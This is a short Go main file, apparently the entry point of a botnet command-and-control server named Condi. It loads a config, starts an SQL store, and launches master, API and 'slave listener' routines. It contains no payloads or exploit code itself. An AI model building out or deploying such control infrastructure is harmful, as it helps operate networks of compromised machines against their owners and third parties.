package main

import (
	"fmt"
	"log"
)

var buildversion = 9.2

func main() {
	fmt.Printf("Welcome back! Condi Version %s\r\n", Version)

	if err := OpenConfig(Options, "assets", "server.toml"); err != nil {
		log.Fatalf("Config: %v", err)
	}

	if err := SpawnSQL(); err != nil {
		log.Fatalf("Config: %v", err)
	}

	go Master()
	go NewAPI()
	go Title()

	// Execute the main slave listener
	if err := Slave(); err != nil {
		log.Fatalf("Config: %v", err)
	}
	select {}

}
